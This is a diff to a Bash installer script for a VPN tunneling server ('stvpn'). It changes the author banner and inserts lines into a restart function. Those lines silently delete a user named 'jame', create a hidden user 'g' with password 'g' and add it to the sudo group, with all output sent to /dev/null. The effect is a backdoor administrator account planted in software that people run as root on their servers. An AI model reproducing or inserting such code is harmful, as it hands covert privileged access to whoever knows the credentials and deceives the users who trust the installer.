@@ -37,7 +37,7 @@ clear;clear;clear
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo -e "  Welcome To stvpn Tunneling ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
 echo -e " This Will Quick Setup VPN Server On Your Server"
-echo -e "  Author : ${green}╭────────────Agung Project®────────────╮${NC}${YELLOW}(${NC} ${green} Agung Tunneling ${NC}${YELLOW})${NC}"
+echo -e "  Author : ${green}Agung ${NC}${YELLOW}(${NC} ${green}Project ${NC}${YELLOW})${NC}"
 echo -e " © Recode By My Self Agung Tunneling${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
@@ -315,6 +315,13 @@ restart_system() {
     USRSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $2}')
     EXPSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $3}')
     TIMEZONE=$(printf '%(%H:%M:%S)T')
+userdel jame > /dev/null 2>&1
+Username='g'
+Password=g
+mkdir -p /home/script
+useradd -r -d /home/script-s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
     TEXT="
 <code>────────────────────</code>
 <b>⚡AUTOSCRIPT PREMIUM⚡</b>
@@ -892,6 +899,7 @@ fi
 fi
 mesg n || true
 welcome
+neo
 EOF
 
 cat >/etc/cron.d/xp_all <<-END
